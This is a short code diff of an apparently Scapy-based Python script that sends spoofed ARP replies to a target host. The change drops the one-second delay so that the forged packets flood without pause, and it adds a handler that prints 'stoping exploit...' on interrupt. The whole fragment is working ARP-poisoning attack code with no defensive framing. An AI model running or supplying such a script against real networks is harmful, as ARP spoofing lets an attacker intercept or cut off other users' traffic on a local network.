@@ -12,8 +12,11 @@ def main(target):
         hwdst=trg[1],
         psrc=spoof_ip
     )
-
-    while True:
-        sendp(packet, verbose=False)
-        print(f"Sent spoofed ARP reply to {trg[0]}")
-        time.sleep(1)
+    try:
+        while True:
+            sendp(packet, verbose=False)
+            #print(f"Sent spoofed ARP reply to {trg[0]}")
+            #time.sleep()
+    except KeyboardInterrupt:
+        print("stoping exploit...")
+        
